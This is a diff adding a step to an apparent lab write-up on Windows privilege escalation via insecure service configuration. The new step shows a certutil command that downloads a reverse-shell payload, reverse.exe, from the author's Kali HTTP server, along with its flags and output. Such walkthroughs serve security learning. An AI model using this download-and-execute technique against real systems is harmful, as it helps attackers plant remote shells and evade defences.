@@ -158,3 +158,24 @@ I clicked reverse.exe to download it. Windows Defender blocked it at first — s
   <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step3-1.png" width="600">
 </p>
 
+## Step 4 — Transferring the Payload to PrivEsc Folder
+
+I opened CMD from C:\PrivEsc and used certutil to download reverse.exe from my Kali HTTP server:
+
+```bash
+certutil -urlcache -split -f http://192.168.5.128/reverse.exe reverse.exe
+```
+### Flag Breakdown
+
+- `-urlcache` : Uses URL cache to download a file
+- `-split` : Splits the download into blocks
+- `-f` : Forces overwrite if file already exists
+
+**Output:**
+
+```text
+CertUtil: -URLCache command completed successfully.
+```
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step4-1.png" width="600">
+</p>
